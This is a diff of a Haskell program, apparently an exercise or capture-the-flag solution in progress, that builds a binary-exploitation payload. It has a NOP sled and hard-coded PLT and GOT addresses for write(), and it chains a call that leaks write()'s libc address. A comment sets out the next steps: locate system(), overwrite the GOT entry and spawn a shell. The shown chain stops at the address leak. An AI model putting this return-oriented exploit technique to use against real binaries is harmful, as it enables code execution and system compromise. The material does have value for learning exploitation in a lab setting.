@@ -30,7 +30,7 @@ import Data.Int (Int64)
 import Data.Monoid ((<>))
 import qualified Data.Text as T
 import Data.Text (Text)
-import GHC.Word (Word32, Word8)
+import GHC.Word (Word32, Word8, byteSwap32)
 import Numeric (showHex)
 import Shelly ((</>), (<.>), (-|-), cmd, inspect, shelly, touchfile, withTmpDir)
 import System.IO (stderr)
@@ -55,24 +55,40 @@ padTo fullBufLength string = nopSled <> string
     nopSled :: ByteString
     nopSled = B.replicate (fromInteger paddingLen) nop
 
--- nonPaddedExploit :: ByteString
--- nonPaddedExploit = shellCode <> encode bufAddress
-
--- nopLength :: Int64
--- nopLength = 112 - 8 - B.length shellCode
-
--- paddedExploit :: ByteString
--- -- paddedExploit = padTo exploitLength nonPaddedExploit
--- paddedExploit = encode secAddress <> B.replicate nopLength nop <> nonPaddedExploit
+toAddr :: Word32 -> Word32
+toAddr = byteSwap32
 
 nops :: ByteString
 nops = B.replicate 140 nop
 
+readAddress :: Word32
+-- this is the plt address
+-- readAddress = toAddr 0x804832c
+-- this is the got address
+readAddress = toAddr 0x804961c
+
+-- this is the plt address
+writeAddressPLT :: Word32
+writeAddressPLT = toAddr 0x804830c
+
+-- this is the got address
+writeAddressGOT :: Word32
+writeAddressGOT = toAddr 0x8049614
+
 exploit :: ByteString
 exploit = "abcd"
 
+-- TODO: This successfully prints out the address of the of write() in
+-- libc.  Next I need to figure out the offset of system(), read() in
+-- that value and overwrite write() in the GOT, then call it one more
+-- time to spawn a shell.
 paddedExploit :: ByteString
-paddedExploit = nops <> exploit
+paddedExploit = nops
+    <> encode writeAddressPLT
+        <> B.replicate 4 nop
+        <> encode (toAddr 1)
+        <> encode writeAddressGOT
+        <> encode (toAddr 4)
 
 main :: IO ()
 main = do
